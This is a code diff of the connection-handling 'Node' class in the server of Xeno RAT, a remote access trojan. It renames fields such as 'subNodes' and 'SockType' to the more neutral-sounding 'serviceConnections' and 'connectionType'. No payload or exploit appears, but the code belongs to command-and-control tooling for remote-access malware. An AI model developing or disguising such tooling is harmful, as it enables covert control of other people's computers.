@@ -19,17 +19,17 @@ namespace xeno_rat_server
         public bool isDisposed = false;
         private Action<Node> OnDisconnect;
         private List<Action<Node>> TempOnDisconnects = new List<Action<Node>>();
-        public List<Node> subNodes;
+        public List<Node> serviceConnections;
         private Dictionary<int, Node> subNodeWait;
         public SocketHandler sock;
         public Node Parent;
         public int ID = -1;
         public int SubNodeIdCount = 0;
-        public int SockType = 0;//0 = main, 1 = heartbeat, 2 = anything else
+        public int connectionType = 0;//0 = main, 1 = heartbeat, 2 = anything else
         public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
         {
             sock = _sock;
-            subNodes = new List<Node>();//make it only initiate if non-plugin/heartbeat
+            serviceConnections = new List<Node>();//make it only initiate if non-plugin/heartbeat
             subNodeWait = new Dictionary<int, Node>();
             OnDisconnect = _OnDisconnect;
         }
@@ -78,13 +78,13 @@ namespace xeno_rat_server
             }
             sock.sock?.Dispose();
             OneRecieveAtATime.Dispose();
-            if (SockType == 0)
+            if (connectionType == 0)
             {
-                foreach (Node i in subNodes.ToList())
+                foreach (Node i in serviceConnections.ToList())
                 {
                     try
                     {
-                        if (i.SockType != 1)
+                        if (i.connectionType != 1)
                         {
                             i?.Disconnect();
                         }
@@ -103,7 +103,7 @@ namespace xeno_rat_server
                 tempdisconnect(this);
             }
             copy.Clear();
-            subNodes.Remove(this);
+            serviceConnections.Remove(this);
         }
         public void SetRecvTimeout(int ms)
         {
@@ -209,7 +209,7 @@ namespace xeno_rat_server
         }
         public async Task AddSubNode(Node subnode) 
         {
-            if (subnode.SockType != 0)
+            if (subnode.connectionType != 0)
             {
                 byte[] retid = await subnode.ReceiveAsync();
                 if (retid == null) 
@@ -222,7 +222,7 @@ namespace xeno_rat_server
             {
                 subnode.Disconnect();
             }
-            subNodes.Add(subnode);
+            serviceConnections.Add(subnode);
         }
         public async Task<bool> AuthenticateAsync(int id)//first call that should ever be made!
         {
@@ -271,7 +271,7 @@ namespace xeno_rat_server
                         int sockId = sock.BytesToInt(data);
                         ID = sockId;
                     }
-                    SockType = type;
+                    connectionType = type;
                     sock.ResetRecvTimeout();
                     return true;
                 }
